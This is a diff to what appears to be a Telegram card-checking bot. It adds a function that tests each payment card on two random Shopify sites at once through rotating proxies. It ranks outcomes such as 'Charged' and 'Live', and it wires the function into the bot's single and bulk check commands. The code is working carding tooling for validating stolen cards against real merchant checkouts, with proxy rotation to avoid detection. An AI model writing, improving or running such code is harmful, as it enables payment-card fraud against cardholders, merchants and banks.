@@ -1370,6 +1370,45 @@ async def check_card_with_retry(card, sites, proxies, max_retries=2):
         return {'status': 'Dead', 'message': f"Site errors: {last_result['message']}", 'card': card, 'gateway': last_result.get('gateway', 'Unknown'), 'price': last_result.get('price', '-'), 'site': 'Multiple'}
     return {'status': 'Dead', 'message': 'Max retries exceeded', 'card': card, 'gateway': 'Unknown', 'price': '-'}
 
+_STATUS_RANK = {'Charged': 3, 'Live': 2, 'Dead': 1, 'Site Error': 0}
+
+async def check_card_dual(card, sites, proxies):
+    """Check card on 2 Shopify sites simultaneously for double speed. Best result wins."""
+    if not sites:
+        return {'status': 'Dead', 'message': 'No sites available', 'card': card, 'gateway': 'Unknown', 'price': '-'}
+    if not proxies:
+        return {'status': 'Dead', 'message': 'No proxies available', 'card': card, 'gateway': 'Unknown', 'price': '-'}
+
+    if len(sites) == 1:
+        result = await check_card_embedded(card, sites[0], random.choice(proxies))
+        if result.get('retry'):
+            return {'status': 'Dead', 'message': result['message'], 'card': card, 'gateway': result.get('gateway', 'Unknown'), 'price': '-'}
+        return result
+
+    selected = random.sample(sites, min(2, len(sites)))
+    tasks = [
+        asyncio.create_task(check_card_embedded(card, selected[0], random.choice(proxies))),
+        asyncio.create_task(check_card_embedded(card, selected[1], random.choice(proxies))),
+    ]
+    done_results = await asyncio.gather(*tasks, return_exceptions=True)
+
+    best = None
+    for r in done_results:
+        if isinstance(r, Exception) or r.get('retry'):
+            continue
+        if best is None or _STATUS_RANK.get(r['status'], 0) > _STATUS_RANK.get(best['status'], 0):
+            best = r
+    if best:
+        return best
+
+    # Both were site errors — retry once with any site
+    for _ in range(2):
+        r = await check_card_embedded(card, random.choice(sites), random.choice(proxies))
+        if not r.get('retry'):
+            return r
+        await asyncio.sleep(0.2)
+    return {'status': 'Dead', 'message': 'All sites returned errors', 'card': card, 'gateway': 'Unknown', 'price': '-'}
+
 async def test_site(site, proxy):
     """Test if a Shopify site is alive by fetching its products."""
     site_url = site['url'] if isinstance(site, dict) else site
@@ -1834,7 +1873,7 @@ async def single_cc_check(event):
         parse_mode='html'
     )
     try:
-        result = await check_card_with_retry(card, sites, proxies, max_retries=3)
+        result = await check_card_dual(card, sites, proxies)
         try:
             brand, bin_type, level, bank, country, flag = await get_bin_info(card.split('|')[0])
         except Exception:
@@ -2443,7 +2482,7 @@ async def _run_bulk_check(user_id, event, pending):
                 active_sites = live_sites if live_sites else filtered_sites
                 if not active_sites or not current_proxies:
                     break
-                res = await check_card_with_retry(card, active_sites, current_proxies, max_retries=1)
+                res = await check_card_dual(card, active_sites, current_proxies)
                 all_results['checked'] += 1
                 all_results['last_card'] = card
                 all_results['last_response'] = res.get('message', '—')
